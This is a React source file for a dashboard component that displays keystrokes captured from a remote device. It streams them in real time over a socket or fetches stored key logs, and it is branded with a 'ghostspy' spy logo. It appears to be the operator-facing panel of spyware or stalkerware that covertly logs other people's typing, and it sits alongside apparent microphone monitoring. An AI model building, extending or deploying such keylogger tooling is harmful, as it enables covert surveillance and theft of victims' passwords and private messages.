import React, { useState, useEffect } from "react";
import { useTranslation } from "react-i18next";

import { Typography, CardMedia, Box } from "@mui/material";
import InputLabel from "@mui/material/InputLabel";
import MenuItem from "@mui/material/MenuItem";
import FormControl from "@mui/material/FormControl";
import Select, { SelectChangeEvent } from "@mui/material/Select";

import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import { useSocket } from "../../hooks/use-socket";
import MonitorViewer from "../monitorViewer";
import Color from "src/theme/colors";
import { getKeyLogs } from "src/store/actions/keylog.action";

const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const { onSocketMonitor, onSocketCloseMonitor } = useSocketFunctions();
  const { socket } = useSocket();

  const [option, setOption] = useState("online");
  const [changeLoading, setChangeLoading] = useState(false);
  const [recieveKeyLogs, setRecieveKeyLogs] = useState([]);

  const handleLogsOptionChange = (event) => {
    setOption(event.target.value);
  };

  useEffect(() => {
    if (option == "online") {
      init();
    } else if (option == "offline") {
      onStaticLogs();
    }
  }, [option]);

  const onKeyMonitorResponse = (data) => {
    const deviceId = device?.deviceId;
    if (deviceId === data.deviceId) {
      // Update state by appending the new log data to the existing array
      setRecieveKeyLogs((prevLogs) => [
        ...prevLogs,
        { keyLogsType: data?.keyLogsType, keylogs: data?.keylogs, keyEvent: data?.keyevent },
      ]);
      setChangeLoading(false);
    }
  };

  const init = async () => {
    const deviceId = device?.deviceId;
    setChangeLoading(true);
    try {
      if (deviceId) {
        await onSocketMonitor(SocketIOPublicEvents.key_monitor, {
          deviceId,
        });

        // Receive the mic from server
        socket.on(`key-logs-shared-${deviceId}`, onKeyMonitorResponse);

        return () => {
          socket.off(`key-logs-shared-${deviceId}`);
        };
      }
    } catch (error) {
      console.error("Error monitoring device:", error);
      setChangeLoading(false);
    }
  };

  // Static Key logs
  const onStaticLogs = async () => {
    try {
      console.log({ device });
      const deviceId = device?.deviceId;
      const response = await getKeyLogs({ deviceId });
    } catch (error) {
      console.log(error);
    }
  };

  // Close the monitor modal
  const onCloseModal = async () => {
    try {
      setRecieveKeyLogs([]);

      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  return (
    <MonitorViewer
      initialState={{
        width: 700,
        height: 500,
        x: 50,
        y: -120,
        minWidth: 400,
        minHeight: 300,
        maxWidth: 700,
        maxHeight: 600,
      }}
      onClose={onCloseModal}
    >
      <Box sx={{ position: "relative", width: "100%", height: "100%" }}>
        {/* Control Tool */}
        <Box
          sx={{
            position: "absolute",
            right: "-180px",
            top: "0%",
            backgroundColor: Color.background.secondary,
            border: `solid 1px ${Color.background.purple}`,
            borderRadius: "5px",
            height: "100%",
            py: 4,
            px: 1,
          }}
        >
          {" "}
          <Typography
            sx={{ fontSize: "14px", color: Color.text.primary, textAlign: "center", mb: 1 }}
          >
            {t("devicesPage.monitors.key-logs-option")}
          </Typography>
          <Box sx={{ width: "130px", minWidth: 127 }}>
            <FormControl fullWidth>
              <Select
                displayEmpty
                className="key-selection"
                labelId="logs-select-label"
                id="logs-select"
                value={option}
                onChange={handleLogsOptionChange}
              >
                <MenuItem value={"online"} sx={{ fontSize: "14px" }}>
                  {t("devicesPage.monitors.key-real-time")}
                </MenuItem>
                <MenuItem value={"offline"} sx={{ fontSize: "14px" }}>
                  {t("devicesPage.monitors.key-offline")}
                </MenuItem>
              </Select>
            </FormControl>
          </Box>
        </Box>

        <Box
          sx={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            pt: 2,
            width: "100%",
            height: "100%",
          }}
        >
          <Box
            sx={{
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
              alignItems: "space-between",
              width: "100%",
              height: "100%",
              overflow: "hidden",
              borderRadius: "5px",
            }}
          >
            {/* Key Log Table Title */}
            <Box
              sx={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                px: 3,
                backgroundColor: Color.background.purple,
                py: 1,
              }}
            >
              <Box sx={{ flex: 1 }}>
                <Typography
                  component="h2"
                  sx={{
                    color: Color.text.primary,
                    textAlign: "left",
                    fontFamily: "Bebas Neue, sans-serif",
                  }}
                >
                  {t("devicesPage.monitors.keyevent")}
                </Typography>
              </Box>

              <Box sx={{ flex: 1 }}>
                <Typography
                  component="h2"
                  sx={{
                    color: Color.text.primary,
                    textAlign: "center",
                    fontFamily: "Bebas Neue, sans-serif",
                  }}
                >
                  {t("devicesPage.monitors.keypackage")}
                </Typography>
              </Box>
              <Box sx={{ flex: 1 }}>
                <Typography
                  component="h2"
                  sx={{
                    color: Color.text.primary,
                    textAlign: "right",
                    fontFamily: "Bebas Neue, sans-serif",
                  }}
                >
                  {t("devicesPage.monitors.keylogs")}
                </Typography>
              </Box>
            </Box>
            {/* Key Logs Panel */}
            <Box
              sx={{
                backgroundColor: "black",
                border: `solid 1px ${Color.background.border}`,
                borderRadius: "5px",
                width: "100%",
                height: "500px",
                p: 1,
                overflowY: "auto",
              }}
            >
              {changeLoading && (
                <Box
                  sx={{
                    position: "absolute",
                    top: 0,
                    left: 0,
                    right: 0,
                    bottom: 0,
                    display: "flex",
                    flexDirection: "column",
                    justifyContent: "center",
                    alignItems: "center",
                    zIndex: 1,
                    color: "white",
                    width: "100%",
                  }}
                >
                  <CardMedia
                    className="screen-body"
                    component="img"
                    src={"/assets/logos/spy/ghostspy-logo-_2_.webp"}
                    sx={{
                      cursor: "default",
                      width: "auto",
                      height: "auto",
                      borderRadius: "0px",
                    }}
                  />
                </Box>
              )}

              {recieveKeyLogs.length !== 0 &&
                recieveKeyLogs
                  .slice()
                  .reverse()
                  .map((item, index) => (
                    <Box
                      key={index}
                      sx={{
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                      }}
                    >
                      <Box sx={{ flex: 1 }}>
                        <Typography
                          component="h2"
                          sx={{ color: Color.text.primary, textAlign: "left" }}
                        >
                          {item.keyEvent}
                        </Typography>
                      </Box>
                      <Box sx={{ flex: 1 }}>
                        <Typography
                          component="h2"
                          sx={{ color: Color.text.primary, textAlign: "center" }}
                        >
                          {item.keyLogsType}
                        </Typography>
                      </Box>
                      <Box sx={{ flex: 1 }}>
                        <Typography
                          component="h2"
                          sx={{ color: Color.text.primary, textAlign: "right" }}
                        >
                          {item.keylogs}
                        </Typography>
                      </Box>
                    </Box>
                  ))}
            </Box>
          </Box>
        </Box>
      </Box>
    </MonitorViewer>
  );
};

export default KeyLogsMonitorViewer;
